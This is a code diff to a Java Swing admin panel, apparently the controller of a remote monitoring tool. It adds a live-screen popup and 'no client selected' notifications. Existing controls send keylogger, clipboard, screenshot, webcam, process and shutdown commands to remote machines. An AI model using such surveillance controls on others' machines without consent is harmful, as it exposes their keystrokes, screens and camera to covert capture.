@@ -26,6 +26,8 @@ import static utils.Command.*;
 
 public class index extends JFrame {
     private JPanel main;
+    private JFrame popup;
+    private JLabel lbl_client_monitor_popup;
     private JScrollPane jsp_txtarea_log;
     private JTextArea txtarea_log;
     private JTextField txt_uuid;
@@ -71,19 +73,25 @@ public class index extends JFrame {
     private JCheckBox toggle_usage;
     private JCheckBox toggle_all;
     private ButtonCustom btn_screenshot;
+    private ButtonCustom btn_screen;
 
     public static volatile boolean isMonitoring = false;
     public static volatile boolean isUseCamera = false;
+    public static volatile boolean isPopupOpen = false;
+
     private static final Integer INDEX_WIDTH = 1380;
     private static final Integer INDEX_HEIGHT = 960;
     private static final Integer CLIENT_MONITOR_WIDTH = 580;
     private static final Integer CLIENT_MONITOR_HEIGHT = 300;
     private static final Integer CLIENT_CAMERA_WIDTH = 580;
+    private static final Integer POPUP_WIDTH = 980;
+    private static final Integer POPUP_HEIGHT = 760;
     private static final Integer CLIENT_CAMERA_HEIGHT = 300;
     private static final Integer NOTIFICATION_SLEEP = 5000;
 
     private static final Object[] tableHeaders = {"Id", "Host Name", "Operating System", "Mac address", "Ip address"};
     private static final String DISCONNECT_MESSAGE_TEMPLATE = "Client [%s] has disconnected!";
+    private static final String NO_USER_MESSAGE_TEMPLATE = "Select a computer please!!";
     public static final String SYSTEM_USAGE_WORKER = "system_usage_worker";
     public static final String MONITOR_WORKER = "monitor_worker";
     public static final String CAMERA_WORKER = "camera_worker";
@@ -116,6 +124,17 @@ public class index extends JFrame {
 
     private void initComponent() {
         /**
+         * Popup
+         */
+        popup = new JFrame();
+        popup.addWindowListener(new java.awt.event.WindowAdapter() {
+            @Override
+            public void windowClosed(java.awt.event.WindowEvent windowEvent) {
+                handlePopupDispose();
+            }
+        });
+        popup.setSize(POPUP_WIDTH, POPUP_HEIGHT);
+        /**
          * Utils
          */
         loading = new ImageIcon(getClass().getResource("loading.gif"));
@@ -131,6 +150,7 @@ public class index extends JFrame {
         /**
          * Component config
          */
+        lbl_client_monitor_popup = new JLabel();
         this.header.setBackground(Color.WHITE);
         this.main.setBackground(Color.WHITE);
         this.left.setBackground(Color.WHITE);
@@ -173,10 +193,14 @@ public class index extends JFrame {
                 txt_cpu.setText(client.getCpu());
                 txt_ip.setText(client.getIp());
                 txt_hostname.setText(client.getHostName());
-
+                showNotification("Changing to "+ client.getOs());
                 if (toggle_camera.isSelected()) {
                     lbl_client_camera.setIcon(loading);
                     fetchClientCamera();
+                }
+                if (isPopupOpen) {
+                    lbl_client_monitor_popup.setIcon(loading);
+                    fetchClientMonitor();
                 }
             }
         });
@@ -200,35 +224,80 @@ public class index extends JFrame {
         this.btn_screenshot.addActionListener(new ActionListener() {
             @Override
             public void actionPerformed(ActionEvent e) {
-                if (currentClientId == null) return;
+                if (currentClientId == null) {
+                    showNotification(NO_USER_MESSAGE_TEMPLATE);
+                    return;
+                }
+                ;
                 admin.onHandle(COMMAND_CLIENT_SCREENSHOT);
             }
         });
         this.btn_clipboard.addActionListener(new ActionListener() {
             @Override
             public void actionPerformed(ActionEvent e) {
-                if (currentClientId == null) return;
+                if (currentClientId == null) {
+                    showNotification(NO_USER_MESSAGE_TEMPLATE);
+                    return;
+                }
+                ;
                 admin.onHandle(COMMAND_CLIENT_CLIPBOARD);
             }
         });
         this.btn_keylog.addActionListener(new ActionListener() {
             @Override
             public void actionPerformed(ActionEvent e) {
-                if (currentClientId == null) return;
+                if (currentClientId == null) {
+                    showNotification(NO_USER_MESSAGE_TEMPLATE);
+                    return;
+                }
+                ;
                 admin.onHandle(COMMAND_CLIENT_KEYLOGGER);
+            }
+        });
+        this.btn_screen.addActionListener(new ActionListener() {
+            @Override
+            public void actionPerformed(ActionEvent e) {
+                if (currentClientId == null) {
+                    showNotification(NO_USER_MESSAGE_TEMPLATE);
+                    return;
+                }
+                if (popup.isDisplayable()) return;
+                if(!isPopupOpen) handlePopupOpen();
+                Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize(); //this is your screen size
+                int x = (screenSize.width - popup.getSize().width) / 2; //These two lines are the dimensions
+                int y = (screenSize.height - popup.getSize().height) / 2;//of the center of the screen
+                popup.setLocation(x, y); //sets the location of the jframe
+
+                lbl_client_monitor_popup.setText(null);
+                lbl_client_monitor_popup.setBorder(null);
+
+                popup.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
+                popup.add(lbl_client_monitor_popup);
+                popup.setResizable(false);
+
+                popup.setVisible(true);
+                isPopupOpen = true;
             }
         });
         this.btn_process.addActionListener(new ActionListener() {
             @Override
             public void actionPerformed(ActionEvent e) {
-                if (currentClientId == null) return;
+                if (currentClientId == null) {
+                    showNotification(NO_USER_MESSAGE_TEMPLATE);
+                    return;
+                }
+                ;
                 admin.onHandle(COMMAND_CLIENT_PROCESS);
             }
         });
         this.btn_logout.addActionListener(new ActionListener() {
             @Override
             public void actionPerformed(ActionEvent e) {
-                if (currentClientId == null) return;
+                if (currentClientId == null) {
+                    showNotification(NO_USER_MESSAGE_TEMPLATE);
+                    return;
+                }
+                ;
                 ShutdownDialog dialog = new ShutdownDialog(admin);
                 /**
                  * Exception "AWT-EventQueue-0" java.lang.ArrayIndexOutOfBoundsException 0 >= 0
@@ -238,6 +307,12 @@ public class index extends JFrame {
         });
         this.toggle_usage.addItemListener(new ItemListener() {
             public void itemStateChanged(ItemEvent e) {
+                if (currentClientId == null) {
+                    showNotification(NO_USER_MESSAGE_TEMPLATE);
+                    toggle_usage.setSelected(false);
+                    return;
+                }
+                ;
                 if (toggle_usage.isSelected()) {
                     toggleUsageON();
                     return;
@@ -247,6 +322,12 @@ public class index extends JFrame {
         });
         this.toggle_camera.addItemListener(new ItemListener() {
             public void itemStateChanged(ItemEvent e) {
+                if (currentClientId == null) {
+                    showNotification(NO_USER_MESSAGE_TEMPLATE);
+                    toggle_camera.setSelected(false);
+                    return;
+                }
+                ;
                 if (toggle_camera.isSelected()) {
                     toggleCameraON();
                     return;
@@ -257,6 +338,12 @@ public class index extends JFrame {
         this.toggle_all.addActionListener(new ActionListener() {
             @Override
             public void actionPerformed(ActionEvent e) {
+                if (currentClientId == null) {
+                    showNotification(NO_USER_MESSAGE_TEMPLATE);
+                    toggle_all.setSelected(false);
+                    return;
+                }
+                ;
                 if (toggle_all.isSelected()) {
                     toggleAllON();
                     return;
@@ -270,7 +357,13 @@ public class index extends JFrame {
         ContextMenu.addDefaultContextMenu(txtarea_log);
         notification = new Notification(this, Notification.Type.WARNING, Notification.Location.TOP_CENTER);
     }
-
+    private void handlePopupDispose() {
+        isMonitoring = false;
+        isPopupOpen = false;
+        System.out.println(" run hereeee");
+        fetchClientMonitor();
+        notification.showNotification("Screen has stopped", NOTIFICATION_SLEEP, Notification.Type.INFO);
+    }
     private void toggleUsageON() {
         workers.get(SYSTEM_USAGE_WORKER).resume();
         workers.get(SYSTEM_USAGE_WORKER).setStatus(true);
@@ -292,6 +385,11 @@ public class index extends JFrame {
         notification.showNotification("System usage has stopped", NOTIFICATION_SLEEP, Notification.Type.INFO);
     }
 
+    private void handlePopupOpen(){
+        isMonitoring = true;
+        fetchClientMonitor();
+    }
+
     private void toggleCameraON() {
         isUseCamera = true;
         fetchClientCamera();
@@ -309,6 +407,8 @@ public class index extends JFrame {
         right_left_middle.setBackground(DISABLE_COLOR);
         notification.showNotification("Camera has stopped", NOTIFICATION_SLEEP, Notification.Type.INFO);
     }
+
+
 
     private void toggleAllON() {
         this.toggle_usage.setSelected(true);
@@ -369,18 +469,16 @@ public class index extends JFrame {
     }
 
     public void fetchClientMonitor(ImageIcon imageIcon) {
-        lbl_client_camera.setText(null);
-        lbl_client_camera.setBorder(null);
-        lbl_client_camera.setIcon(new ImageIcon(
+        lbl_client_monitor_popup.setIcon(new ImageIcon(
                 imageIcon.getImage().getScaledInstance(
-                        CLIENT_MONITOR_WIDTH,
-                        CLIENT_MONITOR_HEIGHT,
+                        POPUP_WIDTH,
+                        POPUP_HEIGHT,
                         Image.SCALE_SMOOTH)
         ));
     }
 
     public void fetchClientCamera(ImageIcon imageIcon) {
-        if(!isUseCamera) return;
+        if (!isUseCamera) return;
         lbl_client_camera.setText(null);
         lbl_client_camera.setBorder(null);
         lbl_client_camera.setIcon(new ImageIcon(
